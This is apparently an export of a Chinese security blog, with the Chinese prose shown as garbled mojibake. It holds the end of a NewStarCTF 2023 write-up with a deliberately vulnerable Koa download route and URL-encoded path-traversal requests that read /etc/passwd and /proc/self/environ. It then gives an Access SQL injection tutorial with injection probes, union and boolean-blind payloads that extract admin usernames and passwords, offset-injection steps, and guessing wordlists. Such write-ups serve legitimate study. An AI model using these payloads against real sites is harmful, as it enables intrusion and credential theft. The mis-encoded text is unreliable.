å‘ç°æ¼æ´ï¼Œè¯·è¿›è¡Œä¿®æ”¹ */ router.get(\"/s/:hashfn\", async (ctx, next) =&gt; { const hash_fn = String(ctx.params.hashfn || '') const hash = hash_fn.slice(0, 64) const from_uid = ctx.query.from_uid const custom_fn = ctx.query.fn // å‚æ•°æ ¡éªŒ if (typeof hash_fn !== \"string\" || typeof from_uid !== \"string\") { // invalid params or query ctx.set(\"X-Error-Reason\", \"Invalid Params\"); ctx.status = 400; // Bad Request return ctx.res.end(); } // æ˜¯å¦ä¸ºå…±äº«çš„æ–‡ä»¶ let IS_FILE_EXIST = await DriveUtil.isShareFileExist(hash, from_uid) if (!IS_FILE_EXIST) { ctx.set(\"X-Error-Reason\", \"File Not Found\"); ctx.status = 404; // Not Found return ctx.res.end(); } // ç³»ç»Ÿä¸­æ˜¯å¦å­˜å‚¨æœ‰è¯¥æ–‡ä»¶ let IS_FILE_EXIST_IN_STORAGE try { IS_FILE_EXIST_IN_STORAGE = fs.existsSync(path.resolve(CONFIG.storage_path, hash_fn)) } catch (e) { ctx.set(\"X-Error-Reason\", \"Internal Server Error\"); ctx.status = 500; // Internal Server Error return ctx.res.end(); } if (!IS_FILE_EXIST_IN_STORAGE) { logger.error(`File ${hash_fn.yellow} not found in storage, but exist in database!`) ctx.set(\"X-Error-Reason\", \"Internal Server Error\"); ctx.status = 500; // Internal Server Error return ctx.res.end(); } // æ–‡ä»¶åå¤„ç† let filename = typeof custom_fn === \"string\" ? custom_fn : (await DriveUtil.getFilename(from_uid, hash)); filename = filename.replace(/[\\\\\\/\\:\\*\\\"\\'\\&lt;\\&gt;\\|\\?\\x00-\\x1F\\x7F]/gi, \"_\") // å‘é€ ctx.set(\"Content-Disposition\", `attachment; filename*=UTF-8''${encodeURIComponent(filename)}`); // ctx.body = fs.createReadStream(path.resolve(CONFIG.storage_path, hash_fn)) await ctx.sendFile(path.resolve(CONFIG.storage_path, hash_fn)).catch(e =&gt; { logger.error(`Error while sending file ${hash_fn.yellow}`) logger.error(e) ctx.status = 500; // Internal Server Error return ctx.res.end(); }) }) module.exports = router; å¯ä»¥çœ‹æ³¨é‡Šæœ‰hintå­˜åœ¨æ¼æ´ã€‚é¦–å…ˆæ˜¯ç»™äº†å¤„ç†GETè¯·æ±‚çš„è·¯ç”±ï¼Œå…¶ä¸­è·¯å¾„ä¸º./s/åŠ ä¸Šå‚æ•°hashfnï¼Œæ£€æµ‹å‰64ä½æ˜¯å¦ä¸ºå“ˆå¸Œå€¼ï¼Œç„¶åä»è¯·æ±‚ä¸­è·å–å‚æ•°fnå’Œfrom_uidï¼Œå…¶ä¸­from_uidè¡¨ç¤ºä¸‹è½½çš„æ–‡ä»¶æ˜¯è¿™ä¸ª uid çš„ç”¨æˆ·åˆ†äº«çš„ï¼›æ¥ç€å°±æ˜¯å‚æ•°æ£€æµ‹ï¼Œæ˜¯å¦ä¸ºå…±äº«æ–‡ä»¶ï¼ˆå‚æ•°ä¸ºå“ˆå¸Œå€¼å’Œfrom_uidï¼‰ï¼Œæ˜¯å¦å­˜å‚¨è¯¥æ–‡ä»¶ï¼Œç„¶åæ–‡ä»¶åå¤„ç†ï¼›æœ€åå‘é€æ—¶åˆ©ç”¨path.resolveå‡½æ•°å¤„ç†ï¼Œæ³¨æ„é‡Œé¢çš„å‚æ•°hash_fnæ˜¯å®Œå…¨å¯æ§çš„ï¼Œæˆ‘ä»¬åªéœ€è¦è®©64ä½å“ˆå¸Œå€¼åé¢è·Ÿä¸Šâ€¦/å³å¯å®ç°è·¯å¾„ç©¿è¶Š ä¸è¿‡è¿™é‡Œ/è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬éœ€è¦urlç¼–ç ä¸€ä¸‹ http://node4.buuoj.cn:28489/s/5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd?from_uid=100000 ![image-20231111194656272](NewStarCTF 2023/image-20231111194656272.png) å¦‚ä¸Šå›¾æˆåŠŸä¸‹è½½å¾—åˆ°ï¼Œæ¥ä¸‹æ¥è¯»å–ç¯å¢ƒå˜é‡å³å¯ /s/5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron?from_uid=100000 ![image-20231111194814579](NewStarCTF 2023/image-20231111194814579.png) 0x03 å‚è€ƒæ–‡ç«  æµ…è°ˆæ–‡ä»¶åŒ…å«ä¹‹åŒ…å«pearcmd.phpæ¼æ´ [wp]NewStarCTF 2023 WEEK3|WEB [ä»[2020å®‰æ´µæ¯]èµ›åä»¥åŠè¿‘æœŸé‡åˆ°çš„SSTIæ€»ç»“] PHPçš„GCæœºåˆ¶ æµ…æPHP GCåƒåœ¾å›æ”¶æœºåˆ¶åŠå¸¸è§åˆ©ç”¨æ–¹å¼â€“å…ˆçŸ¥ç¤¾åŒº php(phar)ååºåˆ—åŒ–æ¼æ´åŠå„ç§ç»•è¿‡å§¿åŠ¿ pharæ–‡ä»¶ä¸Šä¼ çš„éªšå§¿åŠ¿ï¼ˆç»•è¿‡pharã€_HALTï¼‰ phpååºåˆ—åŒ–æ‹“å±•æ”»å‡»è¯¦è§£â€“phar Pharçš„ä¸€äº›åˆ©ç”¨å§¿åŠ¿ gzip","tags":["CTFèµ›äº‹"],"categories":["CTFèµ›äº‹"]},{"title":"SQLæ³¨å…¥ä¹‹Accessç¯‡","path":"/2023/10/08/sql-zhu-ru-zhi-access-shu-ju-ku/","content":"0x01 å‰è¨€ ä¹‹å‰åªæ˜¯å­¦ä¹ äº†æœ€åŸºç¡€çš„MySQLæ•°æ®åº“æ³¨å…¥ï¼Œç„¶åçœ‹äº†å°è¿ªçš„è¯¾è®¤ä¸ºè¿˜æ˜¯å¾ˆæœ‰å¿…è¦èµ¶ç´§æ‹“å±•çš„ï¼Œäºæ˜¯æˆ‘å°±å†™æ­¤æ–‡ç« å­¦ä¹ ä¸€ä¸‹ä¸€äº›å…¶ä»–æ•°æ®åº“çš„ç‰¹æ€§ï¼šå¦‚å¸¸è§„æ³¨å…¥è¯­å¥ã€æ•°æ®åº“æœ¬èº«çš„ç‰¹æ€§ã€ä¸MySQLæ•°æ®åº“çš„åŒºåˆ«ã€‚è¯ä¸å¤šè¯´ï¼Œç›´æ¥å¼€å·ï¼ 0x02 æ¦‚æ‹¬ â€‹ SQLæ³¨å…¥æ˜¯éå¸¸å¸¸è§çš„ä¸€ä¸ªæ¼æ´ï¼Œå¦‚æœç¨‹åºå‘˜åœ¨ç¼–å†™ç½‘ç«™æºç æ—¶æœªå¯¹SQLæ‰§è¡Œè¯­å¥ä½œé˜²æŠ¤æªæ–½ï¼Œé‚£ä¹ˆç”¨æˆ·è¾“å…¥å°±å¯ä»¥æ‰§è¡ŒSQLè¯­å¥ï¼Œå¯¼è‡´ç”¨æˆ·æ•°æ®è¢«åˆ æ”¹ã€æ‹–åº“ã€æŒ‚é©¬ç­‰ã€‚è€Œå®ƒçš„ç§ç±»ä¹Ÿæ ¹æ®å‚æ•°ç±»å‹ã€æäº¤æ–¹å¼ã€æ³¨å…¥æ–¹å¼ä»¥åŠæ•°æ®åº“ç±»å‹çš„ä¸åŒæ¥è¿›è¡ŒåŒºåˆ†ã€‚ â€‹ Accessæ•°æ®åº“æ˜¯ä¸€ç§å°å‹æ•°æ®åº“ç”¨äºå‚¨å­˜æ•°æ®ï¼Œå…¶ä¸­å„ä¸ªå¯¹è±¡ä¹‹é—´å¯ä»¥å»ºç«‹å…³è”ï¼Œæ–¹ä¾¿ç”¨æˆ·å¿«é€ŸæŸ¥è¯¢ä¸è°ƒç”¨æ•°æ®ã€‚å®ƒç›¸å¯¹å…¶ä»–æ•°æ®åº“æ¥è¯´æ¯”è¾ƒç®€å•ï¼Œåªæœ‰ä¸€ä¸ªæ•°æ®åº“ï¼Œé‡Œé¢å­˜æ”¾ç€è¡¨ã€åˆ—ä»¥åŠæ•°æ®ï¼Œé€šè¿‡ç®€å•çš„è¯­å¥å°±å¯ä»¥å®Œæˆæ³¨å…¥ã€‚ä¸€èˆ¬é€šè¿‡è”åˆæ³¨å…¥ã€é€å­—çŒœè§£ã€åç§»æ³¨å…¥ç­‰æ–¹å¼è¿›è¡Œæ”»å‡»ï¼Œåœ¨é¢å¯¹æ­è½½è¿™ç±»æ•°æ®åº“çš„ç½‘ç«™æ—¶ï¼Œä¹Ÿå¯ä»¥é’ˆå¯¹.mdbå’Œ.aspåç¼€åçš„æ–‡ä»¶è¿›è¡Œçˆ†ç ´ï¼Œè¯´ä¸å®šå­˜åœ¨ä¿¡æ¯æ³„éœ²å¯ä»¥ç›´æ¥æ‹¿åˆ°æ•°æ®åº“ã€‚æœ¬æ–‡ä¸»è¦é’ˆå¯¹Accessæ•°æ®åº“çš„æ³¨å…¥çš„åŸç†ä»¥åŠæ”»å‡»æ–¹å¼è¿›è¡Œå½’çº³ã€‚ è¿™é‡Œæä¸€ä¸ªå¸¸è§æ•°æ®åº“ç»„åˆå°tipï¼š asp/: sql server, Access .net : sql server php: PostgreSQL, Mysql java: Oracle, Mysql SQLæ³¨å…¥åˆ¤æ–­æ•°æ®åº“ç±»å‹ 0x03 æ³¨å…¥æ€è·¯ 1ã€é€šè¿‡æŠ¥é”™æˆ–å¸¸è§ç»„åˆåˆ¤æ–­æ•°æ®åº“ç±»å‹ï¼ˆMySQL+PHPã€MSSQL+ASPXã€Oracle+JSPâ€¦ï¼‰ 2ã€æˆªå–è¯·æ±‚åŒ…æ›´æ¢è¯·æ±‚æ–¹å¼ï¼ˆPOSTã€GETâ€¦ï¼‰æˆ–æ›´æ”¹è¯·æ±‚åŒ…å‚æ•°ï¼ˆCookieã€Refererã€User-Agentâ€¦ï¼‰å¯»æ‰¾æ³¨å…¥ç‚¹ 3ã€é€šè¿‡å•å¼•å·ã€ç™¾åˆ†å·æ¥åˆ¤æ–­æ³¨å…¥å‚æ•°ç±»å‹ï¼ˆæ•°å­—å‹ã€å­—ç¬¦å‹ã€æœç´¢å‹â€¦ï¼‰ 4ã€é€‰æ‹©æ”»å‡»æ³¨å…¥æ–¹å¼ï¼ˆè”åˆæ³¨å…¥ã€é€å­—çŒœè§£ã€åç§»æ³¨å…¥â€¦ï¼‰ 5ã€åˆ¤æ–­æ˜¯å¦èƒ½çŒœè§£åˆ°è¡¨åã€åˆ—åï¼Œä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š - å¦‚æœèƒ½çŒœè§£åˆ°è¡¨åå’Œåˆ—åï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨è”åˆæ³¨å…¥æˆ–é€å­—çŒœè§£ - å¦‚æœåªèƒ½çŒœè§£åˆ°è¡¨åï¼Œæ— æ³•çŒœè§£åˆ°åˆ—åï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨åç§»æ³¨å…¥ - å¦‚æœæ— æ³•çŒœè§£åˆ°è¡¨åæˆ–åˆ—åï¼Œé‚£ä¹ˆå¯ä»¥æŸ¥çœ‹ç½‘ç«™æºä»£ç ã€æäº¤çš„å‚æ•°æ¥æ„é€ è¡¨åï¼ˆè¿˜ä¸è¡Œçš„è¯å°±èµ¶ç´§æºœå§ï¼Œæ— ä»ä¸‹æ‰‹çš„ï¼‰ 6ã€è·å–æ•°æ®åº“ä¸­çš„æ•æ„Ÿæ•°æ®ç™»å½•åå°æˆ–ç›´æ¥å†™å…¥webshell ä¸‹é¢å…ˆè®²ç†è®ºï¼Œä¹‹åå®æˆ˜æ“ä½œä¸€ä¸‹ã€‚ 0x04 æ³¨å…¥æ–¹å¼ åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ï¼š ç²—ç•¥å‹ï¼šæäº¤å•å¼•å·' é€»è¾‘å‹ï¼ˆæ•°å­—å‹æ³¨å…¥ï¼‰ï¼šand 1=1 æˆ– and 1=2 é€»è¾‘å‹ï¼ˆå­—ç¬¦å‹æ³¨å…¥ï¼‰ï¼š' and '1'='1 æˆ– 'and '1'='2 é€»è¾‘å‹ï¼ˆæœç´¢å‹æ³¨å…¥ï¼‰ï¼š%' and 1=1 and '%'='% æˆ– %' and 1=2 and '%'='% 4.1 è”åˆæ³¨å…¥ 1ã€åˆ¤æ–­æ³¨å…¥ç‚¹ï¼Œä¸€èˆ¬æ¥è¯´å•å¼•å·ã€å‡å·ã€andç­‰å°±å¯ä»¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ ?id=3' #è¿”å›é¡µé¢ä¸id=3ä¸åŒï¼Œè¯´æ˜å­˜åœ¨æ³¨å…¥ ?id=3-1 #è¿”å›ä¸€ä¸ªä¸id=3ä¸åŒçš„æ­£å¸¸ç•Œé¢ï¼Œè¯´æ˜å·²ç»ä»£å…¥æ•°æ®åº“æ‰§è¡Œï¼Œå­˜åœ¨æ³¨å…¥ ?id=3 and 1=2 #è¿”å›é¡µé¢ä¸and 1=1ä¸åŒï¼Œè¯´æ˜å·²ç»å®Œæˆäº†çœŸå‡åˆ¤æ–­ï¼Œå­˜åœ¨æ³¨å…¥ 2ã€é€šè¿‡order by åˆ¤æ–­å­—æ®µæ•°ï¼Œå°†å­—æ®µæ•°ä»å°åˆ°å¤§ä»¥æ­¤ç±»æ¨ï¼Œç›´è‡³è¿”å›é”™è¯¯é¡µé¢ï¼Œè€Œæ­£ç¡®çš„å­—æ®µæ•°å°±æ˜¯è¿”å›é”™è¯¯çš„å­—æ®µæ•°å‡ä¸€ ?id=3 order by 1 ... ?id=3 order by 10 #è¿”å›é”™è¯¯é¡µé¢ï¼Œå­—æ®µæ•°ä¸º9 3ã€é€šè¿‡è”åˆæŸ¥è¯¢ select * from article where id= -1 union select 1,[column_name],3 from [table_name] å¦‚ï¼š-1 union select 1,username,password,4,5,6,7,8,9,10 from admin é‚£ä¹ˆåœ¨å®é™…åœºæ™¯ä¸­ï¼Œåªéœ€è¦å…ˆæ‰¾åˆ°æ³¨å…¥ç‚¹ï¼Œé€šè¿‡order byè¿›è¡Œå­—æ®µåˆ¤æ–­ï¼Œå†ä½¿ç”¨å¯æ§è¾“å…¥å¯¹ç›®æ ‡æ•°æ®åº“è¿›è¡Œè”åˆæ³¨å…¥å³å¯ï¼Œæœ¬è´¨ä¸Šå’Œ MySQLçš„è”åˆæ³¨å…¥å·®ä¸å¤šï¼Œä¸è¿‡å®ƒæ²¡æœ‰information_schemaåº“ï¼Œéœ€è¦çŒœè§£å®ƒçš„è¡¨åå’Œåˆ—åï¼Œå¦‚æœçŒœå¯¹äº†å°±ä¼šåœ¨ç½‘é¡µä¸Šå›æ˜¾è´¦å·å¯†ç ã€‚å¯ ä»¥å°†ä»¥ä¸‹å¸¸ç”¨çš„è¡¨åå’Œåˆ—åè¿›è¡ŒçŒœè§£ã€‚ å¸¸è§çš„è¡¨åï¼š admin,a_admin,x_admin,m_admin,adminuser,admin_user,article_admin,administrator,manage,manager,member,memberlist,user,users,Manage_User,user_info,admin_userinfo,UserGroups,user_list,login,ç”¨æˆ·,Friend,zl,movie,news,password,clubconfig,config,company,book,art,dv_admin,userinfo å¸¸è§çš„åˆ—åï¼š username,adminusername,admin_username,adminname,admin_name,admin,adminuser,admin_user,usrname,usr_name,user_admin,password,admin_password,administrator,administrators,adminpassword,adminpwd,admin_pwd,adminpass,admin_pass,usrpass,usr_pass,user,name,pass,userpass,user_pass,userpassword,user_password,pwd,userpwd,user_pwd,useradmin,pword,p_word,pass-wd,yonghu,ç”¨æˆ·,ç”¨æˆ·å,å¯†ç ,å¸å·,id,uid,userid,user_id,adminid,admin_id,login_name 4.2 é€å­—çŒœè§£ accessæ•°æ®åº“å‡½æ•°æŸ¥è¯¢å¯å‚è€ƒï¼šMS Access å¸¸ç”¨å‡½æ•° é€å­—çŒœè§£å…¶å®åˆ°æœ€åç”¨çš„å°±æ˜¯å¸ƒå°”ç›²æ³¨ï¼Œæ ¹æ®ç›®æ ‡çš„è¿”å›é¡µé¢å·®å¼‚æ¥åˆ¤æ–­æ³¨å…¥æ˜¯å¦æˆåŠŸï¼Œæ¯”è¾ƒä¾èµ–è¿æ°”ï¼Œéœ€è¦ä¾èµ–å¼ºå¤§çš„å­—å…¸ï¼Œä¸€èˆ¬é‡‡ç”¨çš„SQLè¯­å¥å¦‚ä¸‹ select * from admin where id= * å¦‚ï¼š834 and (select top 1 asc(mid(admin_name,2,1)) from admin)=104 //è¿™é‡Œçš„ascæ˜¯è¿”å›å­—ç¬¦çš„asciiç å€¼ã€‚ //midå‡½æ•°ä¸ºä»æŒ‡å®šå­—ç¬¦ä¸²ä¸­æå–ä¸€äº›å­—ç¬¦ 1ã€åˆ¤æ–­è¡¨å å®é™…ä¸Šå°±æ˜¯å¯¹è¡¨åè¿›è¡ŒçŒœè§£ï¼Œå†æ ¹æ®è¡¨ååšè¿›ä¸€æ­¥æ“ä½œ ?id=843 and exists(select * from [table_name]) ?id=843 and exists(select * from admin1) #è¿”å›é”™è¯¯ç•Œé¢ ?id=843 and exists(select * from admin) #è¿”å›æ­£å¸¸ç•Œé¢ 2ã€çŒœè§£åˆ—å ?id=843 and exists(select [column_name] from admin) ?id=843 and exists(select admin_id from admin) #é¡µé¢æ­£å¸¸ï¼Œåˆ—åæ­£ç¡® ?id=843 and exists(select admin_name from admin) #é¡µé¢æ­£å¸¸ï¼Œåˆ—åæ­£ç¡® ?id=843 and exists(select admin_pass from admin) #é¡µé¢æŠ¥é”™ï¼Œåˆ—åé”™è¯¯ï¼ŒæœªçŒœå‡ºå¯†ç åˆ—å çŒœè§£å‡ºäº†ç›®æ ‡idå’Œç”¨æˆ·åçš„åˆ—ååˆ†åˆ«æ˜¯admin_idå’Œadmin_nameï¼Œä½†æœªçŒœè§£å‡ºå¯†ç åˆ—å 3ã€é€šè¿‡å¸ƒå°”ç›²æ³¨è·å–æ•°æ® åˆ¤æ–­å­—æ®µé•¿åº¦ ?id=834 and (select top 1 len(admin_name) from admin) &gt; [length] ?id=834 and (select top 1 len(admin_name) from admin) &gt; 8 #é¡µé¢æŠ¥é”™ï¼Œé•¿åº¦å°äºæˆ–ç­‰äº8 ?id=834 and (select top 1 len(admin_name) from admin) = 7 #é¡µé¢æ­£å¸¸ï¼Œé•¿åº¦ç­‰äº7 åˆ¤æ–­æ•°æ®ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨burpæˆ–ç›´æ¥å†™è„šæœ¬è·‘å³å¯ ?id=834 and (select top 1 asc(mid(admin_name,1,1)) from admin) &lt; [length] ?id=834 and (select top 1 asc(mid(admin_name,1,1)) from admin)&lt;113 #é¡µé¢æŠ¥é”™ï¼Œadmin_nameåˆ—ç¬¬ä¸€ä¸ªæ•°æ®asciiç å¤§äºç­‰äº113 ?id=834 and (select top 1 asc(mid(admin_name,1,1)) from admin)=113 #é¡µé¢æ­£ç¡®ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªæ•°æ®asciiç ä¸º113ï¼ŒæŸ¥è¯¢asciiè¡¨ä¸ºr ?id=834 and (select top 1 asc(mid(admin_name,2,1)) from admin)=104 #é¡µé¢æ­£ç¡®ï¼Œè¯´æ˜ç¬¬äºŒä¸ªæ•°æ®asciiç ä¸º104ï¼ŒæŸ¥è¯¢asciiè¡¨ä¸ºh æœ€åæ‹¿åˆ°ç”¨æˆ·å 4.3 åç§»æ³¨å…¥ â€‹ åç§»æ³¨å…¥çš„å‰ææ˜¯éœ€è¦çŒœå‡ºè¡¨åä¸”çŸ¥é“ä¸€ä¸ªæˆ–å¤šä¸ªå­—æ®µï¼Œè¿™ä¸ªå‰æå¯ä»¥ä½¿ç”¨ä¹‹å‰çš„æ–¹æ³•è·å¾—ã€‚å®ƒçš„ä¼˜åŠ¿å’ŒåŠ£åŠ¿ä¸€æ ·çªå‡ºï¼Œä¼˜åŠ¿æ˜¯æ— éœ€ç”¨æˆ·åå’Œå¯†ç çš„å­—æ®µå°±å¯ä»¥ç›´æ¥çˆ†å‡ºè´¦å·å¯†ç ï¼ŒåŠ£åŠ¿æ˜¯ä¹Ÿéœ€è¦è¿æ°”ï¼Œä¸èƒ½ä¿è¯ç»å¯¹æˆåŠŸã€‚ â€‹ ä¸»è¦åŸç†æ˜¯æ‹¿åˆ°order byåˆ¤æ–­å‡ºçš„å­—æ®µæ•°xä»¥åŠå›æ˜¾æ­£å¸¸çš„*ï¼Œç„¶åå†ç”¨order byçš„å­—æ®µæ•°xå‡å»2å€çš„*å€¼å³æ˜¯æ‰€éœ€å­—æ®µæ•°ã€‚ä¾‹å¦‚å­—æ®µæ•°ä¸º22ï¼Œå›æ˜¾æ­£å¸¸çš„*å€¼ä¸º6ï¼Œæ‰€éœ€çš„å­—æ®µæ•°å°±æ˜¯22-2x6=10ï¼Œæ ¹æ®è¯¥å€¼è¿›è¡Œæ„é€ å³å¯å®Œæˆåç§»æ³¨å…¥ã€‚ è¿™é‡Œæˆ‘æ„Ÿè§‰ä»–è§£é‡Šçš„ä¸æ¸…æ¥šï¼Œäºæ˜¯æ‰¾äº†å‡ ç¯‡æ–‡ç« ç»§ç»­å­¦ä¹ ï¼š åç§»æ³¨å…¥çš„åŸç† ï¼ˆè¿™é‡Œåªæ˜¯ç²—ç•¥çš„æ¦‚è¿°ï¼Œè¯¦ç»†è¯·çœ‹ä¸‹é¢ï¼‰ï¼š å°±æ˜¯å°†ç›®æ ‡è¡¨è¿›è¡Œ(å¤šçº§)å†…è¿æ¥ï¼Œé€šè¿‡è”åˆæŸ¥è¯¢å’Œå·²çŸ¥ç›®æ ‡å­—æ®µåçš„å¾®è°ƒï¼Œå°†æˆ‘ä»¬æƒ³è¦çŸ¥é“çš„å­—æ®µå€¼åœ¨å·²ç»ç¡®å®šçš„æ˜¾ç¤ºä½ä¸Šæš´éœ²å‡ºæ¥ã€‚ å½±å“åç§»æ³¨å…¥æˆåŠŸç‡çš„å› ç´ ï¼ˆå½“ç„¶è¿™äº›å› ç´ éƒ½æ˜¯å½±å“å› ç´ ï¼Œä¸æ˜¯å†³å®šå› ç´ ï¼‰ï¼š è”åˆæŸ¥è¯¢ä¸­æ˜¾ç¤ºä½çš„ä½ç½® å½“å‰æ³¨å…¥ç‚¹æ‰€æŸ¥è¯¢çš„å­—æ®µæ•°é‡ ç›®æ ‡è¡¨çš„å­—æ®µæ•°é‡ æˆ‘ä»¬å¯ä»¥çŒœè§£åˆ°çš„ç›®æ ‡è¡¨çš„å­—æ®µåçš„æ•°é‡ è¿™é‡Œå…ˆå€ŸåŠ©é‚£ç¯‡æ–‡ç« çš„å›¾ç‰‡äº†â”­â”®ï¹â”­â”® æ­¤æ¬¡å®æˆ˜æµ‹è¯•ä¸»è¦æ¶‰åŠçš„ä¸¤å¼ è¡¨ï¼šproductè¡¨å’Œadminè¡¨ productè¡¨ï¼šè¯¥è¡¨æœ‰22ä¸ªå­—æ®µ adminè¡¨ï¼šè¯¥è¡¨æœ‰6ä¸ªå­—æ®µï¼ˆè¯·è°¨è®°è¿™ä¸ªå­—æ®µæ•°ï¼‰ 1.exist()å‡½æ•°ï¼šç”¨äºæ£€æŸ¥å­æŸ¥è¯¢æ˜¯å¦è‡³å°‘ä¼šè¿”å›ä¸€è¡Œæ•°æ®ï¼Œè¯¥å­æŸ¥è¯¢å®é™…ä¸Šå¹¶ä¸è¿”å›ä»»ä½•æ•°æ®ï¼Œè€Œæ˜¯è¿”å›å€¼Trueæˆ–Falseã€‚ 2.aså…³é”®å­—ï¼šç”¨äºèµ·åˆ«åï¼Œå¯ä»¥ä¸ºè¡¨èµ·åˆ«åï¼Œä¹Ÿå¯ä»¥ä¸ºå­—æ®µèµ·åˆ«åï¼ˆaså…³é”®å­—å¯çœç•¥ï¼‰ 3.è¡¨1 inner join è¡¨2 on ç­›é€‰æ¡ä»¶ ï¼šè¯¥å…³é”®å­—ç”¨äºå°†è¡¨1ä¸è¡¨2åšç¬›å¡å°”ç§¯ï¼Œç„¶åæ ¹æ®onåé¢çš„æ¡ä»¶è¿›è¡Œç­›é€‰ã€‚ 4.top n å…³é”®å­—ï¼šä½œç”¨æ˜¯ä½¿æŸ¥è¯¢ç»“æœåªæ˜¾ç¤ºå‰næ¡è®°å½• ä¸‹å›¾ä¸­selectè¯­å¥çš„æ„æ€æ˜¯ï¼šå°†adminè¡¨ä¸è‡ªå·±åšç¬›å¡å°”ç§¯ï¼Œç„¶åç­›é€‰å‡ºä¸¤è€…idå€¼ç›¸åŒçš„è®°å½• ä¸‹å›¾æ„æ€ä¸ºï¼šæŸ¥è¯¢ admin è¡¨çš„å‰å…­ä¸ªæ•°æ® 4.3.1 æ³¨å…¥åŸç† ä¸ºäº†æ–¹ä¾¿è®²è§£ï¼Œè¿™é‡Œé€‰æ‹© â€œå®æˆ˜â€ å’Œ â€œåç§»æ³¨å…¥çš„æ³¨å…¥åŸç†â€ ç›¸ç»“åˆçš„æ–¹å¼è¿›è¡Œè®¨è®ºã€‚ åç§»æ³¨å…¥çš„æµç¨‹æ˜¯ï¼š åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ åˆ¤æ–­å½“å‰æ³¨å…¥ç‚¹æ‰€æŸ¥è¯¢çš„å­—æ®µæ•°é‡ ï¼ˆè¯·ä¸€å®šè°¨è®°ä»¥ä¸‹çš„ç®€ç•¥è¡¨è¿°ï¼Œåé¢çš„æ–‡ç« å‡é‡‡ç”¨ä»¥ä¸‹ç®€ç•¥è¡¨è¿°ï¼‰ ä½¿ç”¨sqlè¯­å¥å¸®åŠ©ç†è§£ï¼šselect å½“å‰å­—æ®µæ•°é‡ from å½“å‰è¡¨ union select ... from ç›®æ ‡è¡¨ åœ¨è¿™é‡Œã€å½“å‰è¡¨ã€‘-&gt;productè¡¨ï¼›ã€ç›®æ ‡è¡¨ã€‘-&gt;adminè¡¨ çŒœè§£ç›®æ ‡è¡¨çš„è¡¨å ç¡®å®šæ˜¾ç¤ºä½ ç¡®å®šç›®æ ‡è¡¨çš„å­—æ®µæ•°é‡ å¼€å§‹è¿›è¡Œåç§»æ³¨å…¥ï¼Œç»è¿‡ä¸æ–­çš„â€œå¾®è°ƒâ€ï¼Œå°†æˆ‘ä»¬æƒ³è¦çš„å­—æ®µå€¼åœ¨æ˜¾ç¤ºä½å¤„æš´éœ²å‡ºæ¥ã€‚ 4.3.2 åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ ?id=1513 and 1=1 é¡µé¢å›æ˜¾æ­£å¸¸ ?id=1513 and 1=2 é¡µé¢å›æ˜¾é”™è¯¯ è¿™é‡Œä¸çŸ¥ä¸ºä½•æˆ‘çš„1=2ä¹‹åé¡µé¢ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œåªèƒ½å³é”®æºä»£ç çœ‹åˆ°é¡µé¢æ˜¯æŠ¥é”™çš„ è¿™é‡Œè¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œä¸”ä¸ºæ•°å­—å‹æ³¨å…¥ 4.3.3 åˆ¤æ–­å½“å‰å­—æ®µæ•°é‡ ?id=1513 order by 22 é¡µé¢æ˜¾ç¤ºæ­£å¸¸ ?id=1513 order by 23 é¡µé¢æ˜¾ç¤ºé”™è¯¯ è¯´æ˜å½“å‰è¡¨åä¸‹çš„å­—æ®µæ•°ä¸º22 4.3.4 çŒœæµ‹å½“å‰è¡¨çš„è¡¨å è¿™é‡Œæˆ‘çœ‹æ–‡ç« ç”¨çš„æ˜¯existsæ–¹å¼ï¼Œå…¶å®å¸¸è§„çš„è¯åº”è¯¥æ˜¯å¦‚ä¸‹payload UNION select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin ä¹Ÿå°±æ˜¯è”åˆæ³¨å…¥æ–¹å¼ã€‚è¿™é‡Œæ‰¾åˆ°ä¸€ç¯‡æ–‡ç« è¯´ï¼š è”åˆæŸ¥è¯¢æ³•ï¼šé€Ÿåº¦å¿«ï¼Œå…¼å®¹æ€§ä¸å¥½ é€å­—çŒœè§£å‘ï¼šé€Ÿåº¦æ…¢ï¼Œå…¼å®¹æ€§å¥½--ä¹Ÿå°±æ˜¯ä¸Šè¿°çš„existsæ–¹æ³• è¿™é‡Œå‘¢æˆ‘åœ¨æœ€åå†æ”¾å‡ºä¸¤ç§æ–¹æ³•çš„æ³¨å…¥è¯­å¥çš„æ€»ç»“å§ã€‚ ?id=1513 and exists(select * from admin) â€‹ å› ä¸ºaccessæ•°æ®åº“æ²¡æœ‰ç±»ä¼¼äºmysqlçš„information_schemaè¿™æ ·çš„ç³»ç»Ÿç´¢å¼•åº“ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½æ ¹æ®ç»éªŒé çŒœäº†ï¼Œåœ¨çœŸå®çš„æµ‹è¯•ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ç¤¾å·¥çš„æ–¹å¼è¿›è¡ŒçŒœè§£ã€‚ æ­¤æ¬¡é¡µé¢è¿”å›æ­£å¸¸ï¼Œè¯´æ˜å­˜åœ¨accessæ•°æ®åº“ä¸­å­˜åœ¨adminè¡¨ã€‚ æˆ‘ä»¬ä¹Ÿå¯ä»¥è¿›ä¸€æ­¥éªŒè¯ä¸€ä¸‹ï¼Œæ”¹ä¸€ä¸‹å‚æ•°çœ‹çœ‹é¡µé¢çš„å˜åŒ– å¯ä»¥çœ‹åˆ°æŠ¥é”™äº†ï¼Œè¯´æ˜ä¸å­˜åœ¨è¯¥è¡¨ 4.3.5 ç¡®å®šå›æ˜¾ä½ ?id=1513 and 1=2 union select 